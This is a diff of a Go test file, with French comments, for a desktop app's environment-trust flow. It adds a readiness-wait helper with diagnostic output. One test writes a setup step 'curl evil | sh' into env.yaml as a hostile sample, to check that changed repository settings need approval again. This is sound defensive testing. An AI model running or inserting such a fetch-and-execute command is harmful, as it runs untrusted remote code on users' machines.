@@ -9,6 +9,7 @@ package desktop
 
 import (
 	"encoding/json"
+	"fmt"
 	"net/http/httptest"
 	"os"
 	"os/exec"
@@ -62,6 +63,33 @@ func writeEnv215(t *testing.T, dir, env string) {
 func regState215(t *testing.T, dir string) string {
 	t.Helper()
 	return string(core.EnvTrust(dir))
+}
+
+// waitReady215 : attend l'état « ready » du terminal de dir (au plus 20 s) ; sur échec, DIT ce que l'App a émis pour ce
+// projet (statuts, erreurs) et l'état de ses sessions tmux, au lieu d'un simple « pas d'évènement » — une attente de 20 s
+// vue en CI sans cause lisible (TestEnvTrustAnswerAcceptIgnoreCancel215).
+func waitReady215(t *testing.T, f *fix215, dir, what string) {
+	t.Helper()
+	end := time.Now().Add(20 * time.Second)
+	for time.Now().Before(end) {
+		for _, e := range f.r.all() {
+			if e["_name"] == "term" && e["path"] == dir && e["kind"] == "status" && e["state"] == "ready" {
+				return
+			}
+		}
+		time.Sleep(50 * time.Millisecond)
+	}
+	var seen []string
+	for _, e := range f.r.all() {
+		if e["path"] == dir && (e["_name"] == "term" || e["_name"] == "error" || e["_name"] == "msg") {
+			if e["kind"] != "out" && e["kind"] != "layout" {
+				seen = append(seen, fmt.Sprint(e["_name"], "/", e["kind"], " state=", e["state"], " msg=", e["msg"]))
+			}
+		}
+	}
+	sess, _ := exec.Command("tmux", "-L", os.Getenv("CL_DESK_SOCKET"), "list-sessions").CombinedOutput()
+	t.Fatalf("%s : terminal de %s pas « ready » en 20 s\n  évènements : %v\n  sessions tmux : %s\n  onglet ouvert : %v ; ouvertures en cours : %v",
+		what, dir, seen, strings.TrimSpace(string(sess)), f.a.term(dir) != nil, !f.a.waitOpenings(10*time.Millisecond))
 }
 
 // projet existant du bac à sable (alpha), environnement du dépôt posé, entrée pending, affecté au backend pod.
@@ -296,7 +324,7 @@ func TestEnvTrustAnswerAcceptIgnoreCancel215(t *testing.T) {
 	if e, err := core.LoadEnv(dir); err != nil || e.Image != "debian:12" || len(e.Setup) != 0 || len(e.OnStart) != 0 || len(e.Mounts) != 0 {
 		t.Errorf("ignored : LoadEnv = %+v %v, attendu le socle seul", e, err)
 	}
-	f.r.wait(t, 20*time.Second, "ready", isTerm(dir, "status", func(e map[string]any) bool { return e["state"] == "ready" }))
+	waitReady215(t, f, dir, "ouverture après « ignorer »")
 	// l'approbation n'est PAS définitive : le dépôt change (git pull) → la question revient
 	writeEnv215(t, dir, "image: debian:12\nsetup:\n  - curl evil | sh\n")
 	if regState215(t, dir) != "pending" || !core.EnvTrustChanged(dir) {
@@ -326,6 +354,10 @@ func TestEnvTrustAnswerAcceptIgnoreCancel215(t *testing.T) {
 	if regState215(t, dir) != "accepted" {
 		t.Fatalf("état = %s", regState215(t, dir))
 	}
+	// la nouvelle ouverture (après « accepter ») se termine AVANT que le test écrive env.yaml / l'affectation à son tour
+	// (sinon l'ouverture lit ces fichiers pendant leur réécriture) et AVANT la fin du test (l'arrêt de l'App attend les
+	// ouvertures en cours, jusqu'à 20 s : c'était la durée du test en échec)
+	waitReady215(t, f, dir, "ouverture après « accepter »")
 	if err := core.ApplyExec(dir, "docker.io/library/alpine:3.20", "host"); err != nil {
 		t.Fatal(err)
 	}
@@ -350,7 +382,7 @@ func TestEnvTrustAcceptEnvBrutApresRevoir215(t *testing.T) {
 	if v := dispatchJSON(t, f.a, "envTrustAnswer", map[string]any{"path": dir, "choice": "accept", "sha": info["sha"]}); v["tab"] != dir {
 		t.Fatalf("accept = %v", v)
 	}
-	f.r.wait(t, 20*time.Second, "ready", isTerm(dir, "status", func(e map[string]any) bool { return e["state"] == "ready" }))
+	waitReady215(t, f, dir, "ouverture après « accepter »")
 	if e, err := core.LoadEnv(dir); err != nil || len(e.Setup) != 1 || len(e.OnStart) != 1 {
 		t.Errorf("accepted : environnement brut attendu : %+v %v", e, err)
 	}
